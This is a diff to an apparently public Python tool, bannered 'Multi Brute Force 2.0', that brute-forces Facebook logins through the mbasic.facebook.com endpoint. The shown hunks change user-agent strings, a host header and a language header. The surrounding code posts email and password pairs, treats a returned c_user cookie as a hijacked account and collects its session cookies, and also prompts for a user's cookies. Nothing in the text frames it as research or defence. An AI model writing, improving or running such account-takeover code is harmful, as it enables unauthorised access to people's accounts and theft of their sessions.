@@ -33,13 +33,13 @@ else:
 ### HEADERS ###
 
 def banner():
-    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By Ahmed  Alzwage       │\n       /  ^ \/ / // /  ^ \   │•• Github.com/ahmedalzwage ••    │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
+    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By Ahmed  Alzwage      │\n       /  ^ \/ / // /  ^ \   │•• Github.com/ahmedalzwage ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
 
 host="https://mbasic.facebook.com"
 ips=None
 try:
 	b=requests.get("http://ip-api.com/json/").json()["query"]
-	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (X11; Linux i686; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.23;]"}).json()["country"].lower()
+	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+;]"}).json()["country"].lower()
 except:
 	ips=None
 
@@ -215,12 +215,12 @@ def gen():
         cookie = input(k+"\n["+p+"•"+k+"]"+p+" Cookies : ")
         try:
                 data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
-                "user-agent"                : "Mozilla/5.0 (X11; Linux i686; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.23", # AhmedHusenAldukali.
+                "user-agent"                : "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+", # AhmedHusenAldukali.
                 "referer"                   : "https://m.facebook.com/",
-                "host"                      : "m.facebook.com",
+                "host"                      : "free.Facebook.com",
                 "origin"                    : "https://m.facebook.com",
                 "upgrade-insecure-requests" : "1",
-                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+                "accept-language"           : "AR,ar;q=0.9,en-US;q=0.8,en;q=0.7",
                 "cache-control"             : "max-age=0",
                 "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                 "content-type"              : "text/html; charset=utf-8"
@@ -639,7 +639,7 @@ def generate(text):
 ### USER AGENT ###
 
 def defaultua():
-    ua = "Mozilla/5.0 (X11; Linux i686; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.23;]"
+    ua = "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+;]"
     try:
         ugent = open('ugent.txt','w')
         ugent.write(ua)
@@ -728,7 +728,7 @@ def mbasic(em,pas,hosts):
 		}
 	)
 	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
-	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
+	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=5000",data=data).text
 	if "c_user" in list(r.cookies.get_dict().keys()):
 		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
 	elif "checkpoint" in list(r.cookies.get_dict().keys()):
